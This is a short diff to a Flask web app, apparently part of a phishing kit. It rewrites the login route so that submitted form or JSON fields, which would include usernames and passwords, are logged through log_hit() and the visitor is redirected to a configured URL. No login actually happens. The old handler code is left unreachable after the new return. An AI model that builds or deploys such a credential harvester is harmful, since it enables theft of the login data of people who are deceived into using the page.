@@ -76,8 +76,21 @@ def viral_login():
     return render_template("viral/login.html")
 
 
-@app.route("/login", methods=["POST"])
+@app.route("/login", methods=["GET", "POST"])
 def login():
+    if request.method == "GET":
+        return redirect("/viral/login")
+
+    data = {}
+    for k, v in request.form.items():
+        data[k] = v
+
+    if not data:
+        data = request.get_json(silent=True) or {}
+
+    log_hit(data)
+
+    return redirect(config.REDIRECT_URL, code=302)
     data = {}
     for k, v in request.form.items():
         data[k] = v
